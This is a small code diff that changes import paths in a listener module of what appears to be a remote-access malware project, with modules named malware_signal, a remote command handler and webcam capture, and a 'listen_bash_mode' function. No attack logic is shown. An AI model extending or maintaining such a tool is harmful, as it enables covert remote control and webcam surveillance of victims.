@@ -1,11 +1,11 @@
 #command/listen/listener.py
 import asyncio
-from core.data.client import client_id, username
-from core.data.config import ROOM, HOST
-from malware_signal.signal import SignalClient
-from tools.injection_utils.remote_command_handler import RemoteCommandHandler as ReceiverHandler
-from tools.media.web_cam import WebCam
-from malware_signal.peer import Peer
+from app.core.data import client_id, username
+from app.core.data import ROOM, HOST
+from app.malware_signal.signal import SignalClient
+from app.tools.injection_utils.remote_command_handler import RemoteCommandHandler as ReceiverHandler
+from app.tools.media.web_cam import WebCam
+from app.malware_signal.peer import Peer
 
 async def listen_bash_mode():
     retry_delay = 10
